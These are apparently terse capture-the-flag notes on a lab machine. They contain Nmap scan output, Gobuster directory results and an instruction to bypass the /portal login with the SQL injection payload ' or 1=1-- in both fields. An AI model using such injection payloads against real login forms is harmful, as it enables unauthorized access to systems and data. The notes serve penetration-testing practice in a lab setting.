ip address:10.10.54.64


Nmap:

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 22:ac:9b:f8:1d:bd:44:64:8a:b4:81:7e:e8:d0:46:d4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC4kcXfcxqu+5KU783Lq67MY0G4zgBLuVa6pq6eBi/oAXOs6lSi+mr2xRs0M0ULH7TVWN2APTLwUWefyPMcbgzI4Tm+GZKwTRi1POxFdpyNBJunBTdsBve8WDyssYpYMD7KOfsEX2Trl7m5G9zbjxhrmLUdskb1NWfjfduOirH6Jo5mRz0CIubdIazLGGhAEhLlLWOXp96gjjgZB/hoJVpaO46nnByhO8bK/613DnpRDUd1RBUizPm4/SS7aSRpYm72nfGU4gf5f4IM7HsWpTTqR/OdcAgtZeYQoKZKfLf5ho9DaqLBVle06VXc3A0yVOYInYVSOSEpiUFfgrtraByB
|   256 95:3f:4f:c7:7c:e6:0c:d6:32:52:e8:a6:ce:6c:7c:13 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNe2AzVbTd85yNOpbAXA5H+A9m4XY9cDXEghK6rFC2ialmc3SaDHfA49AugD9IB1iBZHBj7cu47+92nL72M5WV8=
|   256 d0:7c:e3:53:1c:15:0e:9f:30:37:f3:64:b0:20:a9:72 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG1mDbFevwF6Z0WbhK6i36r0H0kwH1vHs6OERo51dseF
80/tcp open  http    syn-ack Node.js Express framework
|_http-favicon: Unknown favicon MD5: E084507EB6547A72F9CEC12E0A9B7A36
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Avengers! Assemble!
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Gobuster:

/home (Status: 302)
/img (Status: 301)
/Home (Status: 302)
/assets (Status: 301)
/portal (Status: 200)
/css (Status: 301)
/js (Status: 301)
/logout (Status: 302)


go to /portal and use sql injection to log in: user: ' or 1=1-- pass ' or 1=1--

